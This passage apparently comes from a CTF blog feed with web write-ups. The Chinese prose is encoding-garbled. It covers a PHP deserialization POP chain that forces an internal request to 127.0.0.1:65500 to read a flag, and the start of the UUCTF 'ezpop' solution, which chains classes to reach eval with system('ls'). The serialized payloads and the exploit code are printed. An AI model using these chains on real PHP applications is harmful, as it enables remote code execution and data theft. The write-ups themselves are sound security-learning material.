<p>é‚£å°±å…ˆè¯»ä¸€ä¸‹å½“å‰ç›®å½•ä¸‹çš„flag.phpï¼Œç„¶åæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°åœ¨è¿™ä¸ªå›¾ç‰‡srcä¸­ç¡®å®æœ‰base64åŠ å¯†è¿‡çš„ä¿¡æ¯ <code>?image_path=flag.php</code></p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;data:jpg;base64,PD9waHANCg0KJGEgPSAiZ29vZCBqb2IsYnV0IHRoZXJlIGlzIG5vIGZsYWcNCg0KaSBwdXQgbXkgZmxhZyBpbiBpbnRyYW5ldCgxMjcuMC4wLjE6NjU1MDApDQoNCm91dHNpZGVyIGhhdmUgbm8gcGVybWlzc2lvbnMgdG8gZ2V0IGl0DQoNCmlmIHlvdSB3YW50IGl0LHRoZW4geW91IGhhdmUgdG8gdGFrZSBpdA0KDQpidXQgeW91IGFscmVhZHkga25ldyB0aGUgcnVsZXMNCg0KdHJ5IGl0IjsNCg0KPz4=&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!-- ?source= --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="language-xml">â””â”€# echo PD9waHANCg0KJGEgPSAiZ29vZCBqb2IsYnV0IHRoZXJlIGlzIG5vIGZsYWcNCg0KaSBwdXQgbXkgZmxhZyBpbiBpbnRyYW5ldCgxMjcuMC4wLjE6NjU1MDApDQoNCm91dHNpZGVyIGhhdmUgbm8gcGVybWlzc2lvbnMgdG8gZ2V0IGl0DQoNCmlmIHlvdSB3YW50IGl0LHRoZW4geW91IGhhdmUgdG8gdGFrZSBpdA0KDQpidXQgeW91IGFscmVhZHkga25ldyB0aGUgcnVsZXMNCg0KdHJ5IGl0IjsNCg0KPz4= | base64 -d</span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="variable">$a</span> = <span class="string">&quot;good job,but there is no flag</span></span></span><br><span class="line"><span class="string"><span class="language-php"></span></span></span><br><span class="line"><span class="string"><span class="language-php">i put my flag in intranet(127.0.0.1:65500)</span></span></span><br><span class="line"><span class="string"><span class="language-php"></span></span></span><br><span class="line"><span class="string"><span class="language-php">outsider have no permissions to get it</span></span></span><br><span class="line"><span class="string"><span class="language-php"></span></span></span><br><span class="line"><span class="string"><span class="language-php">if you want it,then you have to take it</span></span></span><br><span class="line"><span class="string"><span class="language-php"></span></span></span><br><span class="line"><span class="string"><span class="language-php">but you already knew the rules</span></span></span><br><span class="line"><span class="string"><span class="language-php"></span></span></span><br><span class="line"><span class="string"><span class="language-php">try it&quot;</span>;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml">                                                                                                                          </span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå‘Šè¯‰æˆ‘ä»¬è¦è¯»åˆ°flagå°±è¦åœ¨å†…ç½‘çš„65500ç«¯å£è®¿é—®æ‰å¯ä»¥<br>é‚£å°±ç»§ç»­ä»æºç ä¸­æ‰¾åˆ°ååºåˆ—åŒ–é“¾ã€‚<br>å’Œä¹‹å‰ç¢°åˆ°è¿™ç§ç±»å‹é¢˜ç›®ä¸€è‡´ï¼Œä¸èƒ½ç›´æ¥è¾“å‡ºflagå°±å»æ‰¾æ€ä¹ˆæ‰èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œå¾ˆå¿«å°±å¯ä»¥æ‰¾åˆ°æ˜¯åœ¨FileViewerç±»ä¸­çš„<br><code>$file = $this-&gt;curl($this-&gt;local.$this-&gt;path);</code>è¿™ä¸ªå‘½ä»¤å°±ä¼šå»è®¿é—®<code>$this-&gt;local</code>çš„<code>$this-&gt;pathæ–‡ä»¶</code><br>è¿™ä¸ªåœ¨FileViewerç±»çš„<code>loadfile</code>å‡½æ•°ä¸­ï¼Œç„¶åæ‰¾åˆ°åŒæ ·è¿™ä¸ªç±»ä¸­çš„<code>_call($f,$a)</code>å‡½æ•°ä¼šæ‰§è¡Œloadfileå‡½æ•°ï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°ä»…ä»…æ˜¯åœ¨è¿™ä¸ªç±»é‡Œé¢ï¼Œæ²¡æœ‰ä½“ç°æ€ä¹ˆæ‰§è¡Œ<br>ç°åœ¨å†å»æ‰¾èƒ½å»æ‰§è¡Œè¿™ä¸ªå‡½æ•°çš„ä¸œè¥¿ï¼Œçœ‹åˆ°<code>Backdoor</code>è¿™ä¸ªç±»ï¼Œï¼ˆè¿™ä¸ªåå­—å°±å·²ç»æç¤ºäº†ï¼‰<br>è¿™ä¸ªç±»ç¬¬ä¸€ä¸ªå‡½æ•°<code>goodman</code>ä½œç”¨è®©ç¬¬ä¸€ä¸ªå‚æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å±æ€§å˜æˆè¿™ä¸ªç±»ä¸­çš„<code>superhacker</code><br>ç¬¬äºŒä¸ª<code>__destruct()</code>é­”æ³•å‡½æ•°ï¼Œå…ˆæ‰§è¡Œä¸€ä¸‹goodmanå‡½æ•°ï¼Œç„¶åæ‰§è¡Œ<code>$this-&gt;a-&gt;c()</code><br>é‚£ä¹ˆå…³é”®å°±æ¥äº†ï¼Œæˆ‘ä»¬å°±åˆ©ç”¨<code>$this-&gt;a-&gt;c()</code>å»æ‰§è¡ŒFileViewerä¸­çš„<code>_call($f,$a)</code><br>é‚£ä¹ˆå®Œæ•´çš„é“¾æ˜¯ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line">å…¥å£ï¼š Backdoor <span class="built_in">__destruct</span>()  </span><br><span class="line">è°ƒç”¨ FileViewer <span class="built_in">_call</span>($f,$a) è·³åˆ°</span><br><span class="line">FileViewer loadfile</span><br></pre></td></tr></table></figure></div>
<p>åœ¨çœ‹å¦‚ä½•å»è®¿é—®å†…ç½‘çš„127.0.0.1:65500&#x2F;flag<br>è¿™é‡Œæˆ‘ä»¬è®¿é—®çš„è·¯å¾„æ˜¯<code>$this-&gt;local</code>æ‹¼æ¥ä¸Š<code>$this-&gt;path</code>,è¿‡æ»¤åªé’ˆå¯¹<code>$this-&gt;path</code>ï¼Œè¿™é‡ŒæŠŠ<code>/flag</code>è¿‡æ»¤äº†<br>é‚£ç»•è¿‡å¾ˆå®¹æ˜“ï¼Œåªè¦æŠŠä¸€éƒ¨åˆ†æ”¾åœ¨<code>$this-&gt;local</code>å°±å¥½äº†ï¼Œä¹Ÿå°±æ˜¯è®©<code>$this-&gt;local</code>ä¸º<code>127.0.0.1:65500/fl</code>è¿™æ ·<br>é‚£å¯¹è¿™ä¸ª<code>$this-&gt;local</code>æœ‰é™åˆ¶çš„å°±æ˜¯__wakeup()è¿™ä¸ªé­”æ³•å‡½æ•°ï¼Œä»–ä¼šé‡ç½®å€¼<br>ç»•è¿‡ä¹Ÿå¾ˆå®¹æ˜“ï¼Œè¿™ä¸ªwakeupå‡½æ•°æ˜¯åœ¨FileViewerç±»åˆå§‹åŒ–çš„æ—¶å€™ä¼šæ‰§è¡Œçš„ï¼Œæˆ‘ä»¬åªè¦ç”¨Backdoorç±»ä¸­çš„goodmanæ–¹æ³•å°±å¯ä»¥é‡æ–°èµ‹å€¼ï¼Œé‚£å…¶å®ä¹Ÿä¸ç”¨ç®¡äº†<br>é‚£ç°åœ¨æ•´ç†æ¸…æ€è·¯ï¼Œå…ˆå†™ä¸€ä¸ªå¤§è‡´çš„poc</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$black_list</span> ;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$local</span> ;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$path</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;local&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$superhacker</span>;</span><br><span class="line">       </span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title class_">FileViewer</span>();</span><br><span class="line">    <span class="variable">$back</span> = <span class="keyword">new</span> <span class="title class_">Backdoor</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$back</span> -&gt; a = <span class="variable">$f</span>; <span class="comment"># å…¥å£ï¼Œå»æ‰§è¡Œ$aç±»ä¸­çš„å‡½æ•°</span></span><br><span class="line">    <span class="variable">$back</span> -&gt; b = <span class="string">&quot;local&quot;</span>; <span class="comment">#è®©goodmanå»ä¿®æ”¹loacl</span></span><br><span class="line">    <span class="variable">$back</span> -&gt; superhacker = <span class="string">&quot;127.0.0.1:65500/fl&quot;</span>; <span class="comment">//è¿™æ˜¯goodmanä¸­æˆ‘ä»¬æƒ³ä¿®æ”¹æˆçš„å€¼</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$back</span> -&gt; a -&gt; path = <span class="string">&quot;ag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>((<span class="title function_ invoke__">serialize</span>(<span class="variable">$back</span>))));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Tzo4OiJCYWNrZG9vciI6Mzp7czoxOiJhIjtPOjEwOiJGaWxlVmlld2VyIjozOntzOjEwOiJibGFja19saXN0IjtOO3M6NToibG9jYWwiO047czo0OiJwYXRoIjtzOjY6ImFnLnBocCI7fXM6MToiYiI7czo1OiJsb2NhbCI7czoxMToic3VwZXJoYWNrZXIiO3M6MTg6IjEyNy4wLjAuMTo2NTUwMC9mbCI7fQ==</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åä¼ å…¥è¿™ä¸ªå‚æ•°ä¹‹å,æŠ¥é”™äº†<br><img src="https://pic1.imgdb.cn/item/67b3567cd0e0a243d4005280.png"><br>æŠ¥é”™çš„ä¿¡æ¯æ˜¯Backdooræ²¡æœ‰loadfileè¿™ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬å†å»çœ‹è¿™è¾¹ååºåˆ—åŒ–çš„æºç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOIT"><figure class="iseeu highlight /autoit"><table><tr><td class="code"><pre><span class="line">$FV = unserialize(base64_decode($path_info))<span class="comment">;</span></span><br><span class="line">            $FV-&gt;loadfile()<span class="comment">;</span></span><br></pre></td></tr></table></figure></div>
<p>æœ€åæ‰§è¡Œloadfileçš„æ˜¯<code>$FV</code>ï¼Œä½†æ˜¯æˆ‘ä»¬ä»£ç é‡Œé¢å®šä¹‰çš„æ˜¯<code>$f</code>åœ¨<code>$back</code>ä¸­ï¼Œç”±äºååºåˆ—åŒ–æ˜¯ä»é‡Œé¢åˆ°å¤–é¢çš„ï¼Œæ‰€ä»¥æœ€åFVæ˜¯Backdoorè¿™ä¸ªç±»çš„ï¼Œ<br>è€Œè¿™ä¸ªç±»æ²¡æœ‰loadfile()è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥è§£å†³æ–¹æ³•ä¹ŸçŸ¥é“äº†ï¼Œæˆ‘ä»¬è®©<code>$back</code>æ˜¯ä¸€ä¸ªæ–°çš„FileViewerç±»çš„ä¸€ä¸ªä»»æ„å±æ€§(ä½†æ˜¯æˆ‘åªæœ‰localå±æ€§æˆåŠŸäº†ï¼Œå¯èƒ½æ˜¯å› ä¸ºlocalæ²¡ä»€ä¹ˆåˆ«çš„é™åˆ¶)ï¼Œç„¶åå»ååºåˆ—åŒ–è¿™ä¸ªæ–°çš„ç±»</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$black_list</span> ;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$local</span> ;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$superhacker</span>;</span><br><span class="line">       </span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title class_">FileViewer</span>();</span><br><span class="line">    <span class="variable">$back</span> = <span class="keyword">new</span> <span class="title class_">Backdoor</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$back</span> -&gt; a = <span class="variable">$f</span>; <span class="comment"># å…¥å£ï¼Œå»æ‰§è¡Œ$aç±»ä¸­çš„å‡½æ•°</span></span><br><span class="line">    <span class="variable">$back</span> -&gt; b = <span class="string">&quot;local&quot;</span>; <span class="comment">#è®©goodmanå»ä¿®æ”¹loacl</span></span><br><span class="line">    <span class="variable">$back</span> -&gt; superhacker = <span class="string">&quot;127.0.0.1:65500/fl&quot;</span>; <span class="comment">//è¿™æ˜¯goodmanä¸­æˆ‘ä»¬æƒ³ä¿®æ”¹æˆçš„å€¼</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$back</span> -&gt; a -&gt; path = <span class="string">&quot;ag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$new_one</span> = <span class="keyword">new</span> <span class="title class_">FileViewer</span>();<span class="comment">#æ–°å»ºä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">    <span class="variable">$new_one</span> -&gt; local = <span class="variable">$back</span>;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>((<span class="title function_ invoke__">serialize</span>(<span class="variable">$new_one</span>))));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">TzoxMDoiRmlsZVZpZXdlciI6Mzp7czoxMDoiYmxhY2tfbGlzdCI7TjtzOjU6ImxvY2FsIjtPOjg6IkJhY2tkb29yIjozOntzOjE6ImEiO086MTA6IkZpbGVWaWV3ZXIiOjM6e3M6MTA6ImJsYWNrX2xpc3QiO047czo1OiJsb2NhbCI7TjtzOjQ6InBhdGgiO3M6NjoiYWcucGhwIjt9czoxOiJiIjtzOjU6ImxvY2FsIjtzOjExOiJzdXBlcmhhY2tlciI7czoxODoiMTI3LjAuMC4xOjY1NTAwL2ZsIjt9czo0OiJwYXRoIjtOO30=</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67b35a17d0e0a243d4005318.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> TlNTQ1RGezIwMGE5YzU2LThiM2MtNDdmMC04ZmNjLWFjYjc5MWQ1N2M4NH0= | <span class="built_in">base64</span> -d</span><br><span class="line">NSSCTF&#123;200a9c56-8b3c-47f0-8fcc-acb791d57c84&#125;   </span><br></pre></td></tr></table></figure></div>
<p>è¿™é¢˜å‚è€ƒçš„å¤§ä½¬wpï¼š<a href="https://blog.csdn.net/Jayjay___/article/details/136852734">NSS [SWPUCTF 2022 æ–°ç”Ÿèµ›] Power!</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>UUCTF_2022æ–°ç”Ÿèµ›(web)WP</title>
    <url>/posts/18581.html</url>
    <content><![CDATA[<p>UUCTF_2022æ–°ç”Ÿèµ›webæ–¹å‘WP</p>
<span id="more"></span>

<h1 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h1><p>é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ob=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;t;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pdata</span>=<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pdata</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="variable">$pdata</span>));</span><br><span class="line">    <span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>,<span class="string">&quot;loveuu!&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data_replace</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>ä¸€é“ååºåˆ—åŒ–é“¾é¢˜ç›®<br>é¦–å…ˆè¦æ‰¾åˆ°ååºåˆ—åŒ–é“¾ï¼Œæˆ‘ä»¬æœ€ç»ˆè¦æ‰§è¡Œçš„æ˜¯youwantç±»ä¸­çš„evalå‡½æ•°ï¼Œå°±è¦æ‰§è¡Œrceè¿™ä¸ªæ–¹æ³•<br>rceè¿™ä¸ªæ–¹æ³•åœ¨outputç±»ä¸­çš„__toString()æ–¹æ³•è°ƒç”¨ï¼Œ__toString()è¦æ€ä¹ˆè°ƒç”¨å‘¢<br>åœ¨nothingç±»ä¸­æœ‰dieå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ‰§è¡Œçš„æ—¶å€™å°±å›è°ƒç”¨__toString()ã€‚<br>ä½†æ˜¯nothingç±»ä¸­æœ‰wakeupé­”æ³•å‡½æ•°ï¼Œä»–ä¼šé‡ç½®ï¼Œæˆ‘ä»¬æƒ³è¦ç»•è¿‡ï¼Œä½†æ˜¯ä¹‹å‰å¸¸ç”¨çš„æ–¹æ³•åœ¨è¿™é‡Œä¸èƒ½ç”¨<br>åŸå› æ˜¯__wakeup () ç»•è¿‡æ¼æ´å­˜åœ¨çš„ç‰ˆæœ¬éœ€è¦æ»¡è¶³  PHP5 &lt; 5.6.25     PHP7 &lt; 7.0.10<br>ä½†æ˜¯è¿™é‡Œç»™äº†æˆ‘ä»¬ä¸€ä¸ªè§£å†³æ–¹æ³•ï¼Œ__destruct()ä¸­é™¤äº†dieå‡½æ•°ï¼Œè¿˜æœ‰ä¸€ä¸ª<code>$this-&gt;b=$this-&gt;t;</code><br>æ—¢ç„¶aä¼šè¢«é‡ç½®ï¼Œä½†æ˜¯è¿™é‡Œbåˆä¼šè¢«èµ‹å€¼ï¼Œé‚£åªè¦æŠŠaå’Œbçš„åœ°å€å…¬ç”¨å°±å¯ä»¥äº†ï¼Œè¿™æ ·bè¢«ä¿®æ”¹çš„æ—¶å€™ï¼Œaä¹Ÿä¼šè¢«ä¿®æ”¹<br>popé“¾ï¼š youwant:rce() -&gt; output:tostring() -&gt; nothing:__destruct()</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">youwant</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; cmd = <span class="string">&#x27;system(&quot;ls&quot;)&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">output</span>();</span><br><span class="line"><span class="variable">$b</span> -&gt; a = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">nothing</span>();</span><br><span class="line"><span class="variable">$c</span> -&gt; a = &amp;<span class="variable">$c</span> -&gt; b;</span><br><span class="line"><span class="variable">$c</span> -&gt; t = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"> O:<span class="number">7</span>:<span class="string">&quot;nothing&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;R:<span class="number">2</span>;s:<span class="number">1</span>:<span class="string">&quot;t&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;output&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;youwant&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;system(&quot;</span>ls<span class="string">&quot;);&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
<p>ä¸Šé¢çš„ç»“æœæ˜¯ä¸è€ƒè™‘åé¢çš„ä»£ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pdata</span>=<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pdata</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="variable">$pdata</span>));</span><br><span class="line">    <span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>,<span class="string">&quot;loveuu!&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data_replace</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>æˆ‘ä»¬ä¸Šé¢æ„é€ çš„åºåˆ—åŒ–çš„æ˜¯nothingç±»ï¼Œä½†æ˜¯è¿™é‡Œåºåˆ—åŒ–çš„æ˜¯UUCTFç±»ï¼Œæ‰€ä»¥è¦è¿›è¡Œ<code>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</code><br>å› ä¸ºUUCTFè¿™ä¸ªç±»æ˜æ˜¾æ˜¯æ— æ³•è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„çš„ã€‚<br>ä½†æ˜¯åœ¨è¿™ä¸ªç±»ä¸­</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="KOTLIN"><figure class="iseeu highlight /kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($<span class="keyword">this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;ob=unserialize(base64_decode($<span class="keyword">this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œä¹Ÿæœ‰ååºåˆ—åŒ–æ“ä½œï¼Œæ‰€ä»¥å¦‚æœè®©è¿™é‡Œçš„basedataä¸ºæˆ‘ä»¬ä¸Šé¢æ„é€ çš„base64ç¼–ç <br>ç„¶åè¿™ä¸ªæ˜¯åœ¨wakeupä¸­ï¼Œåœ¨æœ€åä»£ç ä¸­çš„<code>unserialize($data_replace);</code>ä¸­ååºåˆ—åŒ–åwakeupå°±ä¼šæ‰§è¡Œã€‚<br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ </p>
